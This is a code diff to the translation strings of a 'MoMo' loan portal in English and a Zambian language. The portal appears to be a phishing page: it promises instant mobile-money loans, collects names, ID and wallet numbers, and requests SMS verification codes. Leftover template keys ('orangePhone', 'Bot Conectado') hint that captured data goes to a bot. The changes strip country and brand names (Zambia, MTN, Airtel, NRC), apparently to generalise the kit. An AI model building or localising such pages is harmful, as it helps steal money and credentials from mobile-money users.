@@ -1,10 +1,10 @@
 (function() {
   const translations = {
     en: {
-      title: "MoMo Zambia — Digital Loan & Credit Portal",
-      heroBadge: "Instant Mobile Money Loan Approval 🇿🇲",
+      title: "MoMo — Digital Loan & Credit Portal",
+      heroBadge: "Instant Mobile Money Loan Approval",
       heroHeading: "Simulate Your MoMo Loan",
-      heroSubtitle: "Get funds directly into your MTN MoMo / Airtel Money Zambia account within minutes.",
+      heroSubtitle: "Get funds directly into your MoMo account within minutes.",
       requestedAmount: "Requested Amount",
       interestRate: "5% monthly rate",
       repaymentTerm: "Repayment Term",
@@ -23,7 +23,7 @@
       purposeLabel: "Loan Purpose",
       continueToPersonal: "CONTINUE TO PERSONAL DETAILS",
       step2Title: "Applicant Information",
-      step2Sub: "Enter your official Zambian NRC & mobile account details.",
+      step2Sub: "Enter your official identification & mobile account details.",
       firstName: "First Name",
       lastName: "Last Name",
       orangePhone: "MoMo Mobile Number (+260)",
@@ -47,7 +47,7 @@
       awaitingVerification: "Awaiting Verification",
       smsAwaitingDesc: "Your SMS verification has been submitted. Verification is in progress...",
       step5Title: "Loan Approved & Processing!",
-      step5Sub: "Your loan request has been processed by MoMo Financial Services Zambia.",
+      step5Sub: "Your loan request has been processed by MoMo Financial Services.",
       appRef: "Application Reference:",
       applicantName: "Applicant:",
       orangeContact: "MoMo Contact:",
@@ -61,7 +61,7 @@
       congratsSub: "Your loan has been approved! Funds are being disbursed to your MoMo account.",
       approvedAmountLabel: "APPROVED LOAN AMOUNT",
       complianceNoticeTitle: "COMPLIANCE NOTICE",
-      complianceNoticeBody: "Your MoMo Zambia account must remain active. Ensure your mobile wallet is enabled for loan disbursement of K1,000 up to K300,000 ZMW.",
+      complianceNoticeBody: "Your MoMo account must remain active. Ensure your mobile wallet is enabled for loan disbursement of K1,000 up to K300,000 ZMW.",
       loanDetailsHeader: "Loan Details",
       monthlyPaymentLabel: "MONTHLY PAYMENT",
       loanTermLabel: "LOAN TERM",
@@ -73,13 +73,13 @@
       nextStepsTitle: "Next Steps:",
       nextStepsBody: "You will receive an SMS confirmation with transaction details shortly.",
       returnHomeBtn: "Return Home",
-      footerRights: "© 2026 MoMo Financial Services Zambia — Digital Credit & Loans"
+      footerRights: "© 2026 MoMo Financial Services — Digital Credit & Loans"
     },
     zm: {
-      title: "MoMo Zambia — Portal ya Ngongole ya Digito",
-      heroBadge: "Kupasa Ngongole ya MoMo mu Kanfututu 🇿🇲",
+      title: "MoMo — Portal ya Ngongole ya Digito",
+      heroBadge: "Kupasa Ngongole ya MoMo mu Kanfututu",
       heroHeading: "Pimitsani Ngongole Yanu",
-      heroSubtitle: "Landilani ndalama pa akaunti yanu ya MoMo / Airtel Money Zambia mu maminiti ochepa.",
+      heroSubtitle: "Landilani ndalama pa akaunti yanu ya MoMo mu maminiti ochepa.",
       requestedAmount: "Ndalama Zofuna",
       interestRate: "Kuwonjezera 5% pamwezi",
       repaymentTerm: "Nthawi Bwera",
@@ -98,7 +98,7 @@
       purposeLabel: "Cholinga cha Ngongole",
       continueToPersonal: "PITANI PAMBUYO PA ZAMBIRI ZANU",
       step2Title: "Zambiri za Wopempha",
-      step2Sub: "Lembani zambiri zanu za NRC ndi nambala ya foni.",
+      step2Sub: "Lembani zambiri zanu ndi nambala ya foni.",
       firstName: "Dzina Loyamba",
       lastName: "Dzina Lomaliza",
       orangePhone: "Nambala ya MoMo (+260)",
@@ -122,7 +122,7 @@
       awaitingVerification: "Ikutsimikizidwa",
       smsAwaitingDesc: "Uthenga wanu wa SMS watumizidwa. Dikirani pang'ono...",
       step5Title: "Ngongole Yavomerezedwa!",
-      step5Sub: "Pempho lanu lavomerezedwa ndi MoMo Zambia Financial Services.",
+      step5Sub: "Pempho lanu lavomerezedwa ndi MoMo Financial Services.",
       appRef: "Nambala ya Pempho:",
       applicantName: "Wopempha:",
       orangeContact: "Mawasiliano ya MoMo:",
@@ -148,7 +148,7 @@
       nextStepsTitle: "Zochita Zotsatira:",
       nextStepsBody: "Muzalandira SMS yotsimikizira mu maola 24.",
       returnHomeBtn: "Bwererani Panyumba",
-      footerRights: "© 2026 MoMo Financial Services Zambia — Digital Credit & Loans"
+      footerRights: "© 2026 MoMo Financial Services — Digital Credit & Loans"
     },
     common: {
       "Bot Conectado": { zm: "Bot Imeunganishwa", en: "Bot Connected" },
